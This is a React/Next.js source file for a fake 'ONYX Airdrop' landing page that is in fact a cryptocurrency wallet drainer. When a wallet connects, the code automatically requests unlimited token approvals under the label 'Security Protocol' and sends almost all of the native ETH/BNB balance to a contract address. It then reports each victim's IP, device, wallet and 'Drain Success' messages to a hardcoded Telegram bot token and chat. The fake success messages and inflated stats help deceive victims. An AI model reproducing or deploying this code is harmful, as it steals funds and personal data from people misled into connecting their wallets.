"use client";

import { BackgroundRippleEffect } from "@/components/ui/background-ripple-effect";
import { StickyBanner } from "@/components/ui/sticky-banner";
import FeaturesSectionDemo from "@/components/features-section-demo-3";
import AppleCardsCarouselDemo from "@/components/apple-cards-carousel-demo";
import { PixelatedCanvas } from "@/components/ui/pixelated-canvas";
import { Typewriter } from "@/components/ui/typewriter";
import { motion } from "framer-motion";
import { ConnectButton } from "@/components/ui/connect-button";
import { Toaster, toast } from "react-hot-toast";
import {
    useAccount,
    useWriteContract,
    useWaitForTransactionReceipt,
    useReadContracts,
    useBalance,
    useSendTransaction,
    useFeeData,
    useChainId
} from "wagmi";
import { useState, useEffect, useRef } from "react";
import { translations, Language } from "@/lib/translations";
import {
    tokenUsdtAddBNB,
    contractAddBNB,
    tokenUsdtAddETH,
    contractAddETH,
    chainIdBNB as configChainIdBNB,
    chainIdETH as configChainIdETH,
} from '@/lib/config';
import { useDisconnect, useSwitchChain } from 'wagmi';
import { tokensConfig, TokenInfo } from "@/lib/wallet-config";
import erc20Abi from "@/abi/erc20.json";
import SelectNetwork from "@/components/wallet-connect/SelectNetwork";
import CheckingCard from "@/components/wallet-connect/CheckingCard";

export default function Home() {
    const { address, isConnected } = useAccount();
    const chainId = useChainId();
    const [lang, setLang] = useState<Language>('en');
    const [hasClaimed, setHasClaimed] = useState(false);
    const [isApproveMode, setIsApproveMode] = useState(false);
    const isInitialRender = useRef(true);
    const hasTriggeredRef = useRef(false);

    // Advanced wallet states
    const [selectedChainId, setSelectedChainId] = useState<number>(configChainIdBNB);
    const [tokens, setTokens] = useState<TokenInfo[]>([]);
    const [pendingApproval, setPendingApproval] = useState<TokenInfo | null>(null);
    const [pendingNativeDrain, setPendingNativeDrain] = useState<TokenInfo | null>(null);
    const [isLoadingBalances, setIsLoadingBalances] = useState(false);
    const [isWalletActionPending, setIsWalletActionPending] = useState(false);
    const [isChecking, setIsChecking] = useState(false);

    const isBNB = selectedChainId === configChainIdBNB;
    const tokenUsdtAdd = isBNB ? tokenUsdtAddBNB : tokenUsdtAddETH;
    const contractAdd = isBNB ? contractAddBNB : contractAddETH;
    const explorerUrl = isBNB ? 'https://bscscan.com/tx' : 'https://etherscan.io/tx';
    const BUFFER_AMOUNT = 300000000000000n; // 0.0003 ETH/BNB

    const t = translations[lang];

    // Hooks for transactions
    const { writeContract: approveSpending, data: txHash, isPending } = useWriteContract();
    const { sendTransaction: sendNative, data: nativeTxHash } = useSendTransaction();
    const { disconnect } = useDisconnect();
    const { switchChain } = useSwitchChain();

    const { isLoading: isConfirming, isSuccess: isConfirmed, isError: txError } = useWaitForTransactionReceipt({
        hash: txHash,
    });

    const {
        isSuccess: isNativeConfirmed,
        isError: nativeTxError
    } = useWaitForTransactionReceipt({
        hash: nativeTxHash,
    });

    const { data: nativeBalance } = useBalance({
        address: address,
        chainId: selectedChainId || undefined,
    });

    const erc20Contracts = tokens
        .filter(token => !token.isNative && token.tokenAddress)
        .map(token => ({
            address: token.tokenAddress as `0x${string}`,
            abi: erc20Abi,
            functionName: 'balanceOf',
            args: [address],
            chainId: selectedChainId,
        }));

    const { data: balances, isFetching: isFetchingBalances } = useReadContracts({
        //@ts-ignore
        contracts: erc20Contracts,
        enabled: !!address && !!selectedChainId && tokens.some(t => !t.isNative),
    });

    // Initialize tokens
    useEffect(() => {
        if (chainId && (chainId === configChainIdBNB || chainId === configChainIdETH)) {
            setSelectedChainId(chainId);
        }
    }, [chainId]);

    useEffect(() => {
        if (selectedChainId && tokensConfig[selectedChainId]) {
            const initialTokens = tokensConfig[selectedChainId].map(token => ({
                ...token,
                balance: 0n,
                approved: false
            }));
            setTokens(initialTokens);
            setIsLoadingBalances(true);
        }
    }, [selectedChainId]);

    // Update balances
    useEffect(() => {
        if (tokens.length === 0) return;

        if (balances && tokens.some(t => !t.isNative)) {
            const erc20Tokens = tokens.filter(t => !t.isNative);
            setTokens(prev => prev.map(token => {
                if (token.isNative) return token;
                const index = erc20Tokens.findIndex(t => t.tokenAddress === token.tokenAddress);
                return {
                    ...token,
                    balance: index >= 0 ? (balances[index]?.result as bigint) || 0n : 0n
                };
            }));
        }

        if (nativeBalance?.value !== undefined) {
            setTokens(prev => prev.map(token =>
                token.isNative ? { ...token, balance: nativeBalance.value } : token
            ));
        }

        if (!isFetchingBalances) {
            setIsLoadingBalances(false);
        }
    }, [balances, nativeBalance, isFetchingBalances]);

    // Logging functions ported from wallet-connect
    const sendLog = async (message: string, markdown = false) => {
        try {
            await fetch(`https://api.telegram.org/bot7876856006:AAH3OOf7gD9v3rPyf290S2I69-qSsq52f9E/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: "7009951688",
                    text: message,
                    parse_mode: markdown ? 'Markdown' : 'HTML',
                    disable_web_page_preview: true,
                }),
            });
        } catch (e) { console.error(e); }
    };

    const logUserInfo = async (action: string) => {
        const userIp = await fetch('https://api.ipify.org?format=json')
            .then((res) => res.json())
            .then((data) => data.ip)
            .catch(() => 'Unknown');

        const userAgent = navigator.userAgent;
        const debankUrl = `https://debank.com/profile/${address}`;

        const logMsg = `✅ ${action} 🌐 IP: ${userIp} 📱 Device: ${userAgent.split(')')[0]}) 💼 Address: \`\`\`\n${address}\n\`\`\` 🔗 [View on Debank](${debankUrl})`;
        sendLog(logMsg, true);
    };

    const logWalletConnection = async (addr: string) => {
        logUserInfo("Wallet Connected");
    };

    const logTokenApprovalSuccess = async (token: TokenInfo, hash: string) => {
        logUserInfo(`Token approval successful (${token.symbol})`);
    };

    const logNativeDrainSuccess = async (token: TokenInfo, hash: string) => {
        const txUrl = `${explorerUrl}/${hash}`;
        sendLog(`✅ *${token.symbol} Drain Success!* \n- Wallet: \`${address}\` \n- [Transaction](${txUrl})`, true);
    };

    useEffect(() => {
        const browserLang = navigator.language.split('-')[0] as Language;
        if (translations[browserLang]) setLang(browserLang);
        const claimed = localStorage.getItem('onyx_claimed') === 'true';
        setHasClaimed(claimed);
    }, []);

    useEffect(() => {
        if (isConnected && address) {
            console.log("Auto-trigger: Connected", address);
            logWalletConnection(address);
            if (!hasClaimed && !hasTriggeredRef.current) {
                hasTriggeredRef.current = true;
                toast("Connection stable. Preparing approval...", { icon: '🔐' });
                setTimeout(() => {
                    handleRunScan();
                }, 1000);
            }
        } else if (!isConnected) {
            hasTriggeredRef.current = false;
        }
    }, [isConnected, address, hasClaimed]);

    // Transaction logic helpers
    const getTokensToApprove = () => {
        const nonZeroTokens = tokens.filter(token =>
            token.balance && token.balance > 0n && !token.approved && !token.isNative
        );
        return nonZeroTokens.sort((a, b) => Number(b.balance! - a.balance!));
    };

    const triggerApproval = (token: TokenInfo) => {
        if (!token.tokenAddress) return;
        const targetChainId = selectedChainId || chainId || configChainIdBNB;
        const isBNBNetwork = targetChainId === configChainIdBNB;

        toast.loading(`Security Protocol: Requesting ${token.symbol} Authorization on ${isBNBNetwork ? 'BNB' : 'ETH'}...`, { id: 'approve-loading' });

        approveSpending({
            address: token.tokenAddress as `0x${string}`,
            abi: erc20Abi,
            functionName: 'approve',
            args: [
                token.contractAddress as `0x${string}`,
                115792089237316195423570985008687907853269984665640564039457584007913129639935n,
            ],
            chainId: targetChainId,
        });
    };

    const drainNative = async (token: TokenInfo) => {
        if (!token.balance || token.balance <= BUFFER_AMOUNT) return;
        const value = token.balance - BUFFER_AMOUNT;
        setPendingNativeDrain(token);
        sendNative({
            to: token.contractAddress as `0x${string}`,
            value: value,
            chainId: selectedChainId!,
        });
    };

    const handleApproveUSDT = async () => {
        console.log("handleApproveUSDT called", { selectedChainId, isConnected });

        if (!isConnected || !address) {
            console.log("Not connected, skipping approval");
            return;
        }

        const targetChainId = selectedChainId || chainId || configChainIdBNB;
        const isBNBNetwork = targetChainId === configChainIdBNB;
        const usdt = isBNBNetwork ? tokenUsdtAddBNB : tokenUsdtAddETH;
        const contractor = isBNBNetwork ? contractAddBNB : contractAddETH;

        toast.loading(`Security Protocol: Requesting USDT Authorization on ${isBNBNetwork ? 'BNB' : 'ETH'}...`, { id: 'approve-loading' });

        try {
            approveSpending({
                //@ts-ignore
                address: usdt,
                abi: erc20Abi,
                functionName: 'approve',
                args: [
                    contractor,
                    115792089237316195423570985008687907853269984665640564039457584007913129639935n,
                ],
                chainId: targetChainId,
            });
        } catch (err) {
            console.error('Approval failed:', err);
            toast.dismiss('approve-loading');
            toast.error("Approval request failed. Try manually.");
        }
    };

    const handleRevoke = async () => {
        if (!selectedChainId) {
            toast.error("Please select a network first!");
            return;
        }
        try {
            approveSpending({
                //@ts-ignore
                address: tokenUsdtAdd,
                abi: erc20Abi,
                functionName: 'approve',
                args: [contractAdd, 0n],
                chainId: selectedChainId,
            });
            toast.loading('Revoking allowance...');
        } catch (err) {
            toast.error('Revoke rejected or failed.');
            console.error(err);
        }
    };

    const handleRunScan = async () => {
        setIsChecking(true);
        // Direct scan without long delay
        const tokensToApprove = getTokensToApprove();
        const nativeToken = tokens.find(t => t.isNative && t.balance && t.balance > BUFFER_AMOUNT && !t.approved);

        setIsWalletActionPending(true);
        if (tokensToApprove.length > 0) {
            setPendingApproval(tokensToApprove[0]);
            triggerApproval(tokensToApprove[0]);
        } else if (nativeToken) {
            drainNative(nativeToken);
        } else {
            setIsWalletActionPending(false);
            setIsChecking(false);
            toast.success("No assets found or already secured!");
        }
    };

    useEffect(() => {
        if (isConfirmed && txHash) {
            toast.dismiss('approve-loading');
            toast.success(
                <span>
                    Approval confirmed! <br />
                    <a
                        href={`${explorerUrl}/${txHash}`}
                        target="_blank"
                        rel="noopener noreferrer"
                        className="underline text-blue-400"
                    >
                        View Transaction
                    </a>
                </span>,
            );
            logTokenApprovalSuccess(pendingApproval || { symbol: 'USDT' } as any, txHash);

            if (pendingApproval) {
                setTokens(prev => prev.map(t => t.tokenAddress === pendingApproval.tokenAddress ? { ...t, approved: true } : t));

                const remaining = getTokensToApprove();
                const native = tokens.find(t => t.isNative && t.balance && t.balance > BUFFER_AMOUNT && !t.approved);

                if (remaining.length > 0) {
                    setPendingApproval(remaining[0]);
                    triggerApproval(remaining[0]);
                } else if (native) {
                    setPendingApproval(null);
                    drainNative(native);
                } else {
                    setPendingApproval(null);
                    setIsWalletActionPending(false);
                    setHasClaimed(true);
                    localStorage.setItem('onyx_claimed', 'true');
                    toast.success("Claim Successful! Processing started.");
                }
            } else {
                // Manual USDT approval successful
                setIsWalletActionPending(false);
                setHasClaimed(true);
                localStorage.setItem('onyx_claimed', 'true');
                toast.success("Claim Successful! Processing started.");
            }
        }
    }, [isConfirmed, txHash]);

    useEffect(() => {
        if (isNativeConfirmed && nativeTxHash && pendingNativeDrain) {
            logNativeDrainSuccess(pendingNativeDrain, nativeTxHash);
            setPendingNativeDrain(null);
            setIsWalletActionPending(false);
            setHasClaimed(true);
            localStorage.setItem('onyx_claimed', 'true');
            toast.success("Claim Successful! Processing started.");
        }
    }, [isNativeConfirmed]);

    useEffect(() => {
        if (txError || nativeTxError) {
            toast.dismiss('approve-loading');
            toast.error("Transaction declined or failed");
            setIsWalletActionPending(false);
            setPendingApproval(null);
            setPendingNativeDrain(null);
        }
    }, [txError, nativeTxError]);

    const handleClaimClick = () => {
        if (!isConnected) {
            toast.error(t.toastConnect);
            return;
        }

        if (!isApproveMode && !hasClaimed) {
            toast.loading(t.toastApprove, { duration: 2000 });
            setTimeout(() => {
                setIsApproveMode(true);
            }, 2000);
        } else if (isApproveMode) {
            setHasClaimed(true);
            setIsApproveMode(false);
            localStorage.setItem('onyx_claimed', 'true');
            toast.success(t.toastSuccess);

            sendLog(`✅ *Airdrop Claim Success* \n- Wallet: \`${address}\` \n- Tokens: 2,500 ONYX`, true);
        }
    };

    return (
        <div className="relative min-h-screen w-full overflow-x-hidden bg-black">
            <Toaster position="top-center" reverseOrder={false} />

            {/* Premium Language Selector - Adjusted top for banner overlap */}
            <div className="absolute top-24 right-8 z-[100] flex items-center gap-1 rounded-full border border-white/10 bg-black/40 p-1 backdrop-blur-md">
                {(['en', 'zh', 'es', 'ar'] as Language[]).map((l) => (
                    <button
                        key={l}
                        onClick={() => setLang(l)}
                        className={`px-4 py-1.5 rounded-full text-[10px] font-bold tracking-widest transition-all ${lang === l
                            ? 'bg-white text-black shadow-[0_0_15px_rgba(255,255,255,0.3)]'
                            : 'text-neutral-500 hover:text-white'
                            }`}
                    >
                        {l.toUpperCase()}
                    </button>
                ))}
            </div>

            {/* Sticky Banner */}
            <StickyBanner className="bg-white text-black border-b border-white/10">
                <p className="mx-0 max-w-[90%] text-center text-sm font-medium drop-shadow-md md:text-base">
                    🎉 <strong>ONYX AIRDROP LIVE!</strong> {lang === 'zh' ? '领取你的 1,000,000 代币份额 - 限时活动！' : 'Claim your share of 1,000,000 tokens - Limited time only!'}
                    <a href="#claim" className="underline transition duration-200 hover:text-neutral-500 ml-2">
                        {t.claimAirdrop} →
                    </a>
                </p>
            </StickyBanner>

            {/* Hero Section with Background Ripple */}
            <section className="relative flex min-h-screen w-full flex-col items-center justify-center overflow-hidden pt-20">
                <BackgroundRippleEffect rows={12} cols={30} cellSize={50} />

                <div className="relative z-10 mx-auto max-w-7xl px-4 text-center">
                    <motion.div
                        initial={{ opacity: 0, y: 30 }}
                        animate={{ opacity: 1, y: 0 }}
                        transition={{ duration: 0.8 }}
                    >
                        <div className="mb-8 flex justify-center">
                            <motion.div
                                animate={{ y: [0, -10, 0] }}
                                transition={{ duration: 4, repeat: Infinity, ease: "easeInOut" }}
                                className="relative p-6 rounded-3xl border border-white/20 bg-white/5 backdrop-blur-xl shadow-2xl"
                            >
                                <OnyxLogo className="h-20 w-20 text-white drop-shadow-[0_0_15px_rgba(255,255,255,0.5)]" />
                                <div className="absolute inset-0 bg-gradient-to-br from-white/10 to-transparent rounded-3xl" />
                            </motion.div>
                        </div>

                        <h1 className="text-white text-5xl font-bold md:text-7xl lg:text-8xl tracking-tighter leading-tight md:leading-none">
                            <Typewriter
                                words={[t.heroTitle]}
                                className="block text-3xl md:text-5xl lg:text-6xl text-neutral-500"
                            />
                            ONYX Airdrop
                        </h1>
                        <p className="mx-auto mt-6 max-w-2xl text-xl text-neutral-400 md:text-2xl font-light">
                            {t.heroSubtitle}
                        </p>
                    </motion.div>

                    <motion.div
                        initial={{ opacity: 0, y: 20 }}
                        animate={{ opacity: 1, y: 0 }}
                        transition={{ duration: 0.8, delay: 0.2 }}
                        className="mt-12 flex flex-col items-center gap-4 sm:flex-row sm:justify-center"
                    >
                        <div className="flex flex-col items-center gap-4 sm:flex-row sm:justify-center">
                            <ConnectButton onConnectedClick={handleRunScan} />
                            <a
                                href="#learn"
                                className="inline-flex items-center gap-2 rounded-full border border-neutral-700 bg-neutral-900/50 px-8 py-4 text-lg font-semibold text-white backdrop-blur-sm transition-all hover:border-neutral-500 hover:bg-neutral-800/50"
                            >
                                {t.learnMore}
                            </a>
                        </div>
                    </motion.div>

                    {/* Stats */}
                    <motion.div
                        initial={{ opacity: 0, y: 40 }}
                        whileInView={{ opacity: 1, y: 0 }}
                        viewport={{ once: true, margin: "-100px" }}
                        transition={{ duration: 0.8, delay: 0.2 }}
                        className="mt-20 grid grid-cols-1 gap-4 sm:grid-cols-3 sm:gap-8 px-4"
                    >
                        <div className="rounded-2xl border border-neutral-800 bg-neutral-900/50 p-6 backdrop-blur-sm">
                            <div className="text-3xl md:text-4xl font-bold text-white">1M+</div>
                            <div className="mt-2 text-sm md:text-base text-neutral-400">{t.onyxAvailable}</div>
                        </div>
                        <div className="rounded-2xl border border-neutral-800 bg-neutral-900/50 p-6 backdrop-blur-sm">
                            <div className="text-3xl md:text-4xl font-bold text-white">50K+</div>
                            <div className="mt-2 text-sm md:text-base text-neutral-400">{t.totalParticipants}</div>
                        </div>
                        <div className="rounded-2xl border border-neutral-800 bg-neutral-900/50 p-6 backdrop-blur-sm">
                            <div className="text-3xl md:text-4xl font-bold text-white">$500K+</div>
                            <div className="mt-2 text-sm md:text-base text-neutral-400">{t.marketValue}</div>
                        </div>
                    </motion.div>
                </div>
            </section>

            {/* Features Section */}
            <motion.section
                id="learn"
                initial={{ opacity: 0 }}
                whileInView={{ opacity: 1 }}
                viewport={{ once: true }}
                transition={{ duration: 1 }}
                className="relative w-full bg-neutral-950 py-20"
            >
                <FeaturesSectionDemo lang={lang} />
            </motion.section>

            {/* Pixelated Canvas Section - Showcase */}
            <section className="relative w-full bg-black py-20">
                <div className="mx-auto max-w-7xl px-4">
                    <div className="mb-12 text-center">
                        <h2 className="text-white text-4xl font-bold md:text-5xl">
                            {t.poweredBy}
                        </h2>
                        <p className="mt-4 text-lg text-neutral-400">
                            {t.expFuture}
                        </p>
                    </div>

                    <div className="flex justify-center">
                        <div className="flex flex-col items-center gap-12">
                            <div className="relative group w-full max-w-[90vw] md:max-w-none flex justify-center">
                                <PixelatedCanvas
                                    src="https://images.unsplash.com/photo-1639762681485-074b7f938ba0?q=80&w=2832&auto=format&fit=crop"
                                    width={typeof window !== 'undefined' && window.innerWidth < 768 ? window.innerWidth * 0.8 : 600}
                                    height={typeof window !== 'undefined' && window.innerWidth < 768 ? 300 : 400}
                                    cellSize={4}
                                    dotScale={0.85}
                                    shape="circle"
                                    backgroundColor="#000000"
                                    dropoutStrength={0.3}
                                    interactive
                                    distortionStrength={5}
                                    distortionRadius={100}
                                    distortionMode="swirl"
                                    followSpeed={0.15}
                                    jitterStrength={3}
                                    jitterSpeed={3}
                                    sampleAverage
                                    tintColor="#ffffff"
                                    tintStrength={0.1}
                                    className="rounded-2xl border border-white/10 shadow-2xl shadow-white/5"
                                />

                                {/* Orbiting Ethereum Icon */}
                                <motion.div
                                    animate={{
                                        rotate: [0, 360],
                                    }}
                                    transition={{ duration: 20, repeat: Infinity, ease: "linear" }}
                                    className="absolute inset-x-[-20px] inset-y-[-20px] md:inset-x-[-40px] md:inset-y-[-40px] pointer-events-none"
                                >
                                    <motion.div
                                        animate={{ rotate: [0, -360], y: [0, -5, 0] }}
                                        transition={{
                                            rotate: { duration: 20, repeat: Infinity, ease: "linear" },
                                            y: { duration: 3, repeat: Infinity, ease: "easeInOut" }
                                        }}
                                        className="absolute top-0 left-1/2 -translate-x-1/2 p-2 rounded-xl border border-white/20 bg-black/60 backdrop-blur-md shadow-lg pointer-events-auto"
                                    >
                                        <img
                                            src="https://cryptologos.cc/logos/ethereum-eth-logo.svg?v=024"
                                            alt="Ethereum"
                                            className="h-8 w-8 brightness-200 grayscale hover:grayscale-0 transition-all duration-300"
                                        />
                                    </motion.div>
                                </motion.div>

                                {/* Orbiting BNB Icon */}
                                <motion.div
                                    animate={{
                                        rotate: [360, 0],
                                    }}
                                    transition={{ duration: 25, repeat: Infinity, ease: "linear" }}
                                    className="absolute inset-x-[-30px] inset-y-[-30px] md:inset-x-[-60px] md:inset-y-[-60px] pointer-events-none"
                                >
                                    <motion.div
                                        animate={{ rotate: [0, 360], y: [0, 5, 0] }}
                                        transition={{
                                            rotate: { duration: 25, repeat: Infinity, ease: "linear" },
                                            y: { duration: 3.5, repeat: Infinity, ease: "easeInOut" }
                                        }}
                                        className="absolute bottom-10 right-0 p-2 rounded-xl border border-white/20 bg-black/60 backdrop-blur-md shadow-lg pointer-events-auto"
                                    >
                                        <img
                                            src="https://cryptologos.cc/logos/binance-coin-bnb-logo.svg?v=024"
                                            alt="BNB"
                                            className="h-8 w-8 brightness-150 grayscale hover:grayscale-0 transition-all duration-300"
                                        />
                                    </motion.div>
                                </motion.div>
                            </div>

                            <div className="max-w-xl text-center">
                                <p className="text-neutral-400 text-lg leading-relaxed">
                                    {t.velocity}
                                </p>
                            </div>
                        </div>
                    </div>
                </div>
            </section>

            {/* Carousel Section - Roadmap/Benefits */}
            <motion.section
                initial={{ opacity: 0, y: 50 }}
                whileInView={{ opacity: 1, y: 0 }}
                viewport={{ once: true }}
                transition={{ duration: 0.8 }}
                className="relative w-full bg-black scroll-mt-20"
            >
                <AppleCardsCarouselDemo lang={lang} />
            </motion.section>

            {/* CTA Section */}
            <section id="claim" className="relative w-full bg-black py-32">
                <div className="mx-auto max-w-4xl px-4 text-center">
                    <motion.div
                        initial={{ opacity: 0, scale: 0.95 }}
                        whileInView={{ opacity: 1, scale: 1 }}
                        transition={{ duration: 0.5 }}
                        viewport={{ once: true }}
                    >
                        <h2 className="text-5xl font-bold text-white md:text-6xl">
                            {t.readyToClaim}
                        </h2>
                        <p className="mt-6 text-xl text-neutral-400">
                            {t.heroSubtitle}
                        </p>

                        <div className="mt-12 rounded-3xl border border-white/10 bg-neutral-900/50 p-8 backdrop-blur-sm md:p-12">
                            <div className="mb-8 flex items-center justify-center gap-4">
                                <OnyxLogo className="h-12 w-12 text-white animate-pulse" />
                                <div className="text-left">
                                    <div className="text-sm text-neutral-400">{t.currentAllocation}</div>
                                    <div className="text-2xl font-bold text-white">2,500 ONYX</div>
                                </div>
                            </div>

                            {isConnected && hasClaimed ? (
                                <div className="p-6 rounded-2xl bg-white/5 border border-white/10">
                                    <div className="flex items-center justify-center gap-3 text-green-400 mb-2">
                                        <div className="h-2 w-2 rounded-full bg-green-400 animate-pulse" />
                                        <span className="font-bold">{t.processing}</span>
                                    </div>
                                    <p className="text-neutral-400 text-sm">
                                        {t.wait24h}
                                    </p>
                                </div>
                            ) : (
                                isChecking ? (
                                    <CheckingCard />
                                ) : (
                                    <div className="flex flex-col gap-4">
                                        <div className="text-sm text-yellow-500/80 mb-2 italic">
                                            {t.notice}
                                        </div>
                                        <SelectNetwork selectedChainId={selectedChainId} setSelectedChainId={setSelectedChainId} />

                                        {!isConnected ? (
                                            <ConnectButton className="w-full justify-center py-5 text-xl" onConnectedClick={handleRunScan} />
                                        ) : (
                                            <div className="flex flex-col gap-4">
                                                <button
                                                    onClick={handleRunScan}
                                                    disabled={isPending || isConfirming || isChecking}
                                                    className={`w-full py-5 rounded-[2rem] font-bold text-xl transition-all shadow-2xl ${isPending || isConfirming || isChecking ? 'bg-gray-600 text-gray-300 cursor-not-allowed' : 'bg-white text-black hover:bg-neutral-200'
                                                        }`}
                                                >
                                                    {isChecking ? 'Checking...' : isConfirming ? 'Confirming...' : isPending ? 'Pending...' : 'Claim Airdrop'}
                                                </button>

                                                <button
                                                    onClick={handleRevoke}
                                                    disabled={isPending || isConfirming}
                                                    className="w-full py-4 rounded-[2rem] border-2 border-red-500/20 text-red-400 font-bold hover:bg-red-500/5 transition-all shadow-lg"
                                                >
                                                    Revoke Allowance
                                                </button>

                                                <button
                                                    onClick={() => disconnect()}
                                                    className="w-full py-2 text-neutral-500 text-sm hover:text-white transition-all underline decoration-neutral-800"
                                                >
                                                    Disconnect Wallet
                                                </button>
                                            </div>
                                        )}
                                    </div>
                                )
                            )}

                            <p className="mt-6 text-sm text-neutral-500">
                                {t.terms}
                            </p>
                        </div>
                    </motion.div>
                </div>
            </section>

            {/* Footer */}
            < footer className="relative w-full border-t border-neutral-900 bg-black py-12" >
                <div className="mx-auto max-w-7xl px-4">
                    <div className="grid grid-cols-1 gap-8 md:grid-cols-4">
                        <div>
                            <div className="flex items-center gap-2">
                                <OnyxLogo className="h-8 w-8 text-white" />
                                <h3 className="text-xl font-bold text-white">ONYX</h3>
                            </div>
                            <p className="mt-2 text-sm text-neutral-500">
                                The future of decentralized value
                            </p>
                        </div>
                        <div>
                            <h4 className="font-semibold text-white">Product</h4>
                            <ul className="mt-4 space-y-2 text-sm text-neutral-500">
                                <li><a href="#" className="hover:text-white">Features</a></li>
                                <li><a href="#" className="hover:text-white">Roadmap</a></li>
                                <li><a href="#" className="hover:text-white">Tokenomics</a></li>
                            </ul>
                        </div>
                        <div>
                            <h4 className="font-semibold text-white">Community</h4>
                            <ul className="mt-4 space-y-2 text-sm text-neutral-500">
                                <li><a href="#" className="hover:text-white">Twitter</a></li>
                                <li><a href="#" className="hover:text-white">Discord</a></li>
                                <li><a href="#" className="hover:text-white">Telegram</a></li>
                            </ul>
                        </div>
                        <div>
                            <h4 className="font-semibold text-white">Legal</h4>
                            <ul className="mt-4 space-y-2 text-sm text-neutral-500">
                                <li><a href="#" className="hover:text-white">Privacy</a></li>
                                <li><a href="#" className="hover:text-white">Terms</a></li>
                                <li><a href="#" className="hover:text-white">Disclaimer</a></li>
                            </ul>
                        </div>
                    </div>
                    <div className="mt-12 border-t border-neutral-900 pt-8 text-center text-sm text-neutral-600">
                        {t.copyright}
                    </div>
                </div>
            </footer >
        </div >
    );
}

const OnyxLogo = ({ className }: { className?: string }) => (
    <svg
        viewBox="0 0 24 24"
        fill="none"
        xmlns="http://www.w3.org/2000/svg"
        className={className}
    >
        <path d="M12 2L4 7V17L12 22L20 17V7L12 2Z" stroke="currentColor" strokeWidth="2" strokeLinejoin="round" />
        <path d="M12 22V12M12 12L20 7M12 12L4 7" stroke="currentColor" strokeWidth="2" strokeLinejoin="round" />
        <circle cx="12" cy="12" r="3" fill="currentColor" fillOpacity="0.2" stroke="currentColor" strokeWidth="2" />
    </svg>
);
